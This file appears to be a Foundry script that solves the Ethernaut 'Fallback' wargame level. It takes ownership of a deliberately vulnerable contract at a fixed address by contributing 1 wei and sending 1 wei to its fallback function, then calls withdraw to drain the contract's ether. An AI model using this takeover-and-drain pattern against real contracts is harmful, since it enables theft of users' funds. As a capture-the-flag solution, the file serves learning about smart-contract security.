// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {

    Fallback public fallbackInstance = Fallback(payable(0x902a4ECb49086c16ccD8BEE88F76Fcb472C6D5A6));

    function run() external {
        // 1. Claim ownership
        // Contribute more than current owner
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackInstance.contribute{value:1 wei}();
        address(fallbackInstance).call{value:1 wei}("");

        // 2. Drain eth
        fallbackInstance.withdraw();
        vm.stopBroadcast();
    }
}